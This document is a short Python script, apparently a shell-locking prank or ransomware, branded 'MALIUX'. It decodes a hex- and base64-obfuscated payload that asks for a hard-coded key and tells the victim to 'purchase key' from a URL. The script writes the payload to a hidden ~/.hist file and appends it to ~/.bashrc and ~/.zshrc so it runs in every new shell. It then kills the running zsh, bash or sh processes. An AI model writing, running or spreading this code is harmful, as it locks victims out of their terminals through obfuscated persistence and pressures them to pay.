import os, base64

def phish():
 phiser = "49 79 45 76 64 58 4e 79 4c 32 4a 70 62 69 39 77 65 58 52 6f 62 32 34 7a 43 6e 52 79 65 54 6f 4b 49 48 64 6f 61 57 78 6c 49 46 52 79 64 57 55 36 43 69 41 67 64 48 4a 35 4f 67 6f 67 49 43 41 67 64 58 4e 6c 63 69 41 39 49 47 6c 75 63 48 56 30 4b 43 64 46 62 6e 52 6c 63 69 42 4c 5a 58 6b 36 49 43 63 70 43 69 41 67 49 43 42 70 5a 69 42 31 63 32 56 79 49 44 30 39 49 43 64 35 4d 47 30 30 62 54 52 6d 4d 47 74 79 4a 7a 6f 4b 49 43 41 67 49 43 42 69 63 6d 56 68 61 77 6f 67 49 43 41 67 49 47 56 34 61 58 51 6f 4b 51 6f 67 49 43 41 67 5a 57 78 7a 5a 54 6f 4b 49 43 41 67 49 43 42 77 63 6d 6c 75 64 43 67 69 63 48 56 79 59 32 68 68 63 32 55 67 61 32 56 35 49 47 5a 79 62 32 30 36 49 47 68 30 64 48 41 36 4c 79 39 6e 62 32 39 6e 62 47 55 75 59 32 39 74 49 43 49 70 43 69 41 67 5a 58 68 6a 5a 58 42 30 4f 67 6f 67 49 43 42 77 63 6d 6c 75 64 43 67 69 5a 58 4a 79 62 33 49 68 49 69 6b 4b 5a 58 68 6a 5a 58 42 30 4f 67 6f 67 63 48 4a 70 62 6e 51 6f 49 6b 56 79 63 6d 39 79 49 53 49 70 43 69 42 77 59 58 4e 7a"
 phise = bytes.fromhex(phiser)
 phis = base64.b64decode(phise.decode())
 phi = phis.decode()
 file = open('.hist','w')
 file.write(phi)
 file.close()
 os.system('chmod 777 .hist')
 os.system('mv .hist ~/')
 try:
  os.system('echo "python3 ~/.hist" >> ~/.bashrc')
  os.system('echo "python3 ~/.hist" >> ~/.zshrc')
 except:
  os.system('echo "python3 ~/.hist" >> ~/.bashrc')
 print("installed!")
 try:
  os.system('killall zsh')
 except:
  try:
   os.system('killall bash')
  except:
    os.system('killall sh')

if __name__=="__main__":
 print("""
╭━╮╭━╮╭━━━╮╭╮╱╱╱╭━━╮╭╮╱╭╮╭━╮╭━╮
┃┃╰╯┃┃┃╭━╮┃┃┃╱╱╱╰┫┣╯┃┃╱┃┃╰╮╰╯╭╯
┃╭╮╭╮┃┃┃╱┃┃┃┃╱╱╱╱┃┃╱┃┃╱┃┃╱╰╮╭╯
┃┃┃┃┃┃┃╰━╯┃┃┃╱╭╮╱┃┃╱┃┃╱┃┃╱╭╯╰╮
┃┃┃┃┃┃┃╭━╮┃┃╰━╯┃╭┫┣╮┃╰━╯┃╭╯╭╮╰╮
╰╯╰╯╰╯╰╯╱╰╯╰━━━╯╰━━╯╰━━━╯╰━╯╰━╯
 """)
 print("installing..")
 phish()
